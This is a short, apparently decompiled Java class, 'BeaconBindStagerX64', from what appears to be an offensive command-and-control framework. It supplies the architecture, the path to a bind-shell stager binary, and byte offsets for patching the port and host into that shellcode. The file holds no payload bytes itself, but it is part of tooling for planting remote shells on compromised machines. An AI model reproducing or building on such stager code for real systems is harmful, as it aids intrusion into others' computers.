package stagers;

import common.ScListener;

public class BeaconBindStagerX64 extends GenericBindStager {
   public BeaconBindStagerX64(ScListener var1) {
      super(var1);
   }

   public String arch() {
      return "x64";
   }

   public String getFile() {
      return "resources/bind64.bin";
   }

   public int getPortOffset() {
      return 240;
   }

   public int getDataOffset() {
      return 503;
   }

   public int getBindHostOffset() {
      return 242;
   }
}
